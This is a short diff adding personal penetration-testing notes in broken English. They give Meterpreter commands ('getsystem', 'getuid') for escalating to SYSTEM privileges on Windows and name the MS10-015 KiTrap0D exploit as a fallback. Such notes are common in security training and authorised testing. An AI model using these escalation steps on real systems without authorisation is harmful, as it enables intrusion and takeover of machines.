@@ -1,0 +1,8 @@
+# In meterpreter to obtain administrator privileges you need to run this
+getsystem
+
+# and then
+getuid
+
+# The retorn must to be Server username: AUTORIDADE NT\SYSTEM
+# IF ITS DOESN'T WORK, YOU NEED TO SEE THE MS10_015_KITRAP0D EXPLOIT
